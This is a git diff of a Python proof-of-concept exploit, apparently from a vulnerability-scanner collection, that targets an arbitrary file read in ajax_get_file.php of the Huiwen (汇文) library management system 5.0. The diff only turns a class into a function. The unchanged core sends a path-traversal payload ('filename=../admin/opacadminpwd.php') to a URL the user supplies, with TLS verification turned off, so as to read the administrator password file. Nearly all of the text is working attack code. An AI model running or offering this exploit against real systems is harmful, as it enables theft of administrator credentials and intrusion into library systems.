@@ -8,17 +8,10 @@ description: 漏洞影响5.0版本,漏洞文件位于ajax_get_file.php中,参数
 import sys
 import requests
 import warnings
-
-  
-
-class ajax_get_file_fileread:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['汇文软件图书管理系统ajax_get_file.php任意文件读取','','']
         payload = "/opac/ajax_get_file.php?filename=../admin/opacadminpwd.php"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, timeout=10, verify=False)
 
@@ -34,5 +27,4 @@ class ajax_get_file_fileread:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = ajax_get_file_fileread(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
